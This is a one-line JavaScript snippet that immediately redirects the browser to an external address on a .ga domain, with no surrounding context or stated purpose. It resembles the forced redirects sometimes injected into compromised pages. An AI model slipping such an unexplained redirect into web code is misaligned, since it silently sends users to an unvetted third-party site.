(() => { 
  window.location.href = "https://b57.liveball9.ga/";
})()
